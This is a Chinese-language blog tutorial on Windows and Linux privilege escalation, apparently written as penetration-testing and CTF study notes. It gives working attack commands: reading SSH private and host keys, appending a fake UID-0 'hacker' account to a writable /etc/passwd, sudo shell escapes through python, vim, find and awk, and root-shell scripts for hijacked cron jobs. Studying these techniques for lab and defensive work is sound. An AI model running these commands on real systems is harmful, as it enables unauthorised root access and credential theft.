---
title: Windows + Linux 提权
date: 2026-08-24 14:15:00
categories:
  - 渗透测试
tags:
  - 提权
  - Linux
  - Windows
description: Windows + Linux 提权
---

## windows提权

[还在苦恼Windows提权？这篇超详细总结，从零基础到精通，收藏这篇就够了！-CSDN博客](https://blog.csdn.net/Libra1313/article/details/146821897)

提权路线：**Webshell(apache)、数据库权限** -> **系统普通用户权限** ->**Administrator权限** -> **System权限**

### 一、信息收集

```php
systeminfo  # 查询系统信息，了解系统版本、补丁情况等
hostname    # 主机名，确认目标身份
net user    # 查看用户信息，看看有哪些用户可以下手
netstat -ano | find "3389"  # 查看3389端口（远程桌面）对应的PID，方便后续攻击
wmic os get caption  # 查看系统名称，更精准地了解系统版本
wmic qfe get Description,HotFixID,InstalledOn  # 查看补丁信息，看看哪些漏洞可以利用
wmic product get name,version  # 查看当前安装程序，寻找可利用的第三方软件
wmic service list brief  # 查询本机服务，看看有没有可以利用的服务漏洞
wmic process list brief  # 查询本机进程，了解系统运行情况
net share   # 查看本机共享列表，寻找敏感文件
netsh firewall show config  # 查看防火墙配置，看看有没有可以绕过的规则
```

### 二、分类：

- 系统内核溢出漏洞提权： 就像钻系统的小窟窿，风险高，收益也高。
- 数据库提权： 从数据库下手，曲线救国。
- 错误的系统配置提权： 系统配置不当，简直是白给。
- 组策略首选项提权： 偷偷修改组策略，神不知鬼不觉。
- WEB中间件漏洞提权： 攻破WEB服务器，直捣黄龙。
- DLL劫持提权： 狸猫换太子，用恶意DLL替换系统DLL。
- 滥用高危权限令牌提权： 偷取令牌，冒充大佬。
- 第三方软件/服务提权等： 抓住第三方软件的小辫子，也能提权。

## Linux提权

[Linux提权详解 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/436960.html)

### 一、提权原理

Linux 提权主要分为**内核提权**和**其他类型提权**。内核提权的优点是针对存在漏洞的内核版本通常可通用利用，但缺点是稳定性差，易导致 shell 丢失或系统崩溃。常见的提权思路包括：先上传信息收集脚本，枚举系统内核和配置；再结合系统开启的服务，进行有针对性的提权操作。

#### ①权限划分

##### 用户和组

1. 用户:管理员和普通用户（系统用户，自定义用户）
2. 组：在 Linux 中的每个用户必须属于一个组，不能独立于组外在 Linux 中每个文件有所有者、所在组、其它组的概念同样，用户组的信息我们可以在 /etc/group 中查看


##### **/etc/passwd 文件**

1. 作用：     记录用户基本属性
2. 格式：     用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell

##### /etc/shadow 文件

1. 作用：**存储用户加密密码及相关账号安全信息**

2. 格式：   用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留

3. **加密的密码具有固定格式：**`$id$salt$encrypted`

   > id 表示加密算法，1 代表 MD5，5 代表 SHA-256，6 代表 SHA-512
   >
   > salt 为盐值，系统随机生成
   >
   > encrypted 表示密码的 hash 值

##### 文件提权（rwx)

1. ls -l:查看当前目录文件的权限
2. ls -la:可以查看当前目录全部文件权限（包括隐藏文件)


例如：

drwxr-xr-x 10 echoin echoin 4096 Dec 20 14:57 Desktop

- `drwxr-xr-x`：类型 + 权限
- `d`：目录
-  `-` 普通文件
- `r` = read（读）
- `w` = write（写）
- `x` = execute（执行）
- `rwxr-xr-x`：权限（owner(`rwx`)=可读可写可进入/执行；group/others(`r-x`)=可读可进入/执行，不可写），数值是 **755**
- `10`：硬链接数（目录常见≈2+子目录数）
- `echoin echoin`：所有者 / 所属组
- `4096`：目录项占用空间（不是目录内文件总大小）
- `Dec 20 14:57`：最后修改时间（目录内容变更会更新）
- `Desktop`：目录名
- 如果你想把权限转成数字（比如 755），对应关系是：`rwx` = 7，`r-x` = 5，所以 `rwxr-xr-x` = `755`。

##### 特殊提权

- **SUID（Set User ID）**：应用于可执行文件，当该文件被执行时，临时赋予执行者“文件所有者”的权限，而不是执行者本人的权限，常用于如`passwd`等系统命令。
- **SGID（Set Group ID）**：作用类似于 SUID，不过是切换到“文件所属组”的权限；若用于目录，则新创建的文件会自动继承该目录的所属组。
- **SBIT（Sticky Bit）**：主要用于目录，表示**只有文件的所有者或管理员**才有权限删除或修改该目录下的文件，常见于`/tmp`目录，用于保护用户的临时文件不被其他用户删除。

#### ②信息收集

##### 工具：LinEnum

- LinEnum（收集系统的基本信息）

- linux-smart-enumeration（详细的枚举信息）
- Linux_Exploit_Suggester（迅速检查该版本是否存在已知漏洞）

[Linux提权辅助工具_linux-exploit-suggester.sh-CSDN博客](https://blog.csdn.net/weixin_43571641/article/details/124374101)

使用：

```php
# 示例: 
./LinEnum.sh -r results.txt -e /tmp/ -t

# 参数：
-k  输入在收集信息的过程中需要匹配的关键字
-e  生成的文件放在哪个目录下
-t  记录测试的过程
-s  输入密码用来检测sudo权限的信息
-r  输入报告的名称
-h  显示帮助信息
```

![image-20251221150853303](/img/ctf/win-linux-privesc-001.png)

Linux_Exploit_Suggester      运行： ./les.sh

![image-20251221154536543](/img/ctf/win-linux-privesc-002.png)

##### 手动收集：

###### 查看系统信息

```php
# 打印所有可用的系统信息 
uname -a 
# 内核版本
uname -r 
# 系统主机名。
uname -n 
# 查看系统内核架构（64位/32位）
uname -m 
# 内核信息 
cat /proc/version 
# 分发信息 
cat /etc/*-release 
# CPU信息 
cat/proc/cpuinfo 
```

###### 用户和群组

```php
# 列出系统上的所有用户
cat /etc/passwd
# 查看 root 用户的本地邮件（可能包含系统通知）
cat /var/mail/root
cat /var/spool/mail/root
# 列出系统上的所有用户组
cat /etc/group
# 列出所有的超级用户账户（UID = 0）
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }'
# 查看当前用户
whoami
# 查看当前已登录的用户及其活动
w
# 查看最近登录的用户列表
last
# 查看所有用户的上次登录信息
lastlog
# 查看指定用户的上次登录信息（将 %username% 替换为用户名）
lastlog -u 用户名
```

###### 查找明文密码

```php
# 在文件中查找包含 "user"（不区分大小写）的行
grep -i user [filename]
# 在文件中查找包含 "pass"（不区分大小写）的行
grep -i pass [filename]
# 在文件中查找包含 "password" 的行，并显示上下 5 行的内容
grep -C 5 "password" [filename]
# 查找当前目录及子目录中所有 .php 文件，查找其中包含 "var $password" 的行，并显示行号
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"
```

###### ssh 私钥

```php
# 查看当前用户的 SSH 授权密钥
cat ~/.ssh/authorized_keys
# 查看当前用户的 SSH 身份密钥（公钥）
cat ~/.ssh/identity.pub
# 查看当前用户的 SSH 身份密钥（私钥）
cat ~/.ssh/identity
# 查看当前用户的 RSA 公钥
cat ~/.ssh/id_rsa.pub
# 查看当前用户的 RSA 私钥
cat ~/.ssh/id_rsa
# 查看当前用户的 DSA 公钥
cat ~/.ssh/id_dsa.pub
# 查看当前用户的 DSA 私钥
cat ~/.ssh/id_dsa
# 查看 SSH 客户端配置文件
cat /etc/ssh/ssh_config
# 查看 SSH 服务端配置文件
cat /etc/ssh/sshd_config
# 查看 SSH DSA 主机公钥
cat /etc/ssh/ssh_host_dsa_key.pub
# 查看 SSH DSA 主机私钥
cat /etc/ssh/ssh_host_dsa_key
# 查看 SSH RSA 主机公钥
cat /etc/ssh/ssh_host_rsa_key.pub
# 查看 SSH RSA 主机私钥
cat /etc/ssh/ssh_host_rsa_key
# 查看 SSH 主机公钥
cat /etc/ssh/ssh_host_key.pub
# 查看 SSH 主机私钥
cat /etc/ssh/ssh_host_key
```

### 二、Linux提权方法

#### 内核提权

利用工具Linux_Exploit_Suggester（迅速检查该版本是否存在已知漏洞）

#### /etc/passwd提权

当系统错误地将`/etc/passwd`设置为可写时，攻击者可以向其中添加一个伪造的 root 用户（UID 为 0）。通过这个账号登录后，就能直接获取系统最高权限。该方法简单有效，常见于配置不当的系统或靶机环境中。

利用：

LinEnum工具：

![image-20251221160635349](https://cdn.jsdelivr.net/gh/Echoin-613/image@main/img/image-20251221160635349.png)

**利用过程**：

生成伪造 root 账号密码串

使用`openssl`或`python`生成一个加密密码，例如密码为`123456`

![image](/img/ctf/win-linux-privesc-004.png)

```php
openssl passwd -1 123456

//多种方式生成加密密码：
# 使用 mkpasswd 生成 SHA-512 哈希值
mkpasswd -m SHA-512 123456
# 使用 Python 中的 crypt 库生成哈希值
python -c 'import crypt; print crypt.crypt("123456", "$6$salt")'
# 使用 Perl 和 crypt 生成哈希值
perl -le 'print crypt("123456", "abc")'
# 使用 PHP 生成哈希值
php -r "print(crypt('123456','123') . ' ');"
```

构造账号条目

例如添加一个名为`hacker`的 root 用户

```
hacker:$1$gsScV.jb$NaQjGTtNccPyBYkFQYNad0:0:0:root:/root:/bin/bash
```

追加到`/etc/passwd`文件中

使用普通用户直接写入

```
echo 'hacker:$1$gsScV.jb$NaQjGTtNccPyBYkFQYNad0:0:0:root:/root:/bin/bash' >> /etc/passwd
```

切换到新账号

```
su hacker
```

#### Docker提权

Docker 提权是指通过容器配置漏洞或不当设置，突破容器的隔离限制，从而获得宿主机的 root 权限。

#### SUID提权

SUID（Set User ID）是文件权限的一种设置，当一个文件具有 SUID 权限时，执行该文件的用户将临时获得该文件拥有者的权限，通常是 root 权限。这种权限主要用于允许普通用户执行某些高权限的操作，例如访问或修改系统资源。然而，若某些二进制文件或实用程序错误地设置了 SUID 权限，攻击者便可以利用这些文件提升权限，从而获得 root 权限，造成安全风险

使用信息收集工具，查找root权限的SUID文件

越权：

```php
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
```

#### Sudo提权

在 Linux 系统中，`sudo`命令用于让普通用户以其他用户（通常是 root）的身份执行命令。正常情况下，执行`sudo`需要输入用户自己的密码，但为了运维方便，管理员可能会在`sudoers`文件中配置某些用户或命令为无需密码（NOPASSWD）即可执行。如果这些配置不当，攻击者可能利用它们执行高权限命令，从而实现本地提权，因此 sudo 配置错误常常是提权的关键入口之一。

通过信息收集工具可以快速扫描系统中存在的 SUID 程序和 sudo 权限配置

![image](/img/ctf/win-linux-privesc-005.png)

若发现用户可以通过`sudo`执行 Python，通常可以使用以下命令：

```php
sudo python -c 'import os; os.system("/bin/bash")'
```

**其他命令**

```php
sudo /bin/bash
# 使用 sudo 启动一个新的 Bash shell。若 sudo 配置允许执行该命令，用户便能获取 root 权限并进入 shell。
sudo /bin/sh
# 与 sudo /bin/bash 类似，使用 sudo 启动一个新的 sh shell。常用于一些环境下无法使用 Bash，但仍能通过其他 shell 提权的情况。
sudo python -c 'import os; os.system("/bin/bash")'
# 通过 Python 的 os.system() 方法执行命令。该命令在 Python 中执行 bash，从而获得一个新的 shell 以提权。
sudo perl -e 'exec "/bin/bash"'
# 利用 Perl 语言中的 exec 函数直接执行 /bin/bash，从而获得 root 权限下的 Bash shell。
sudo vim -c '!sh'
# 使用 vim 编辑器执行命令 !sh 启动一个新的 shell。vim 的 -c 参数用于在启动时执行 Vim 命令，这里使用它来启动 sh shell。
sudo vi -c '!sh'
# 与 sudo vim -c '!sh' 类似，利用 vi 编辑器的 -c 参数执行命令 !sh，从而获得一个新的 shell。
sudo find / -exec /bin/bash \;
# 使用 find 命令遍历系统文件，并通过 -exec 参数执行 /bin/bash。如果 sudo 配置允许执行该命令，就会启动一个 Bash shell。
sudo awk 'BEGIN {system("/bin/sh")}'
# 使用 awk 命令执行系统命令。这里通过 BEGIN 动作直接执行 sh，启动一个新的 shell。
```

#### _定时任务提权

定时任务（cron job）是 Linux 系统中用于定期执行任务的工具，允许系统在指定时间间隔内自动运行命令或脚本。由于 cron 通常以 root 权限执行，如果攻击者能够修改 cron 配置文件或其执行的脚本或二进制文件，就可以利用 root 权限执行任意代码，从而实现提权。攻击者通过获取对定时任务的控制，能够在系统中以 root 权限运行恶意代码，造成严重的安全威胁。

手工查看定时任务的命令`vim /etc/crontab`

工具查看：

![image-20251221162546887](/img/ctf/win-linux-privesc-006.png)

**提权命令**

```php
#!/bin/bash
# 使用 Shell 脚本启动一个新的 bash shell 提权
/bin/bash

#!/usr/bin/python
# 使用 Python 的 os.system 方法执行命令，启动 bash 提权
import os
# 执行 /bin/bash 提权命令
os.system("/bin/bash")

#!/usr/bin/perl
# 使用 Perl 的 exec 方法执行 bash 提权
exec("/bin/bash");

#!/usr/bin/ruby
# 使用 Ruby 的 exec 方法执行 bash 提权
exec("/bin/bash")

#!/usr/bin/lua
-- 使用 Lua 的 os.execute 方法执行 bash 提权
os.execute("/bin/bash")
```















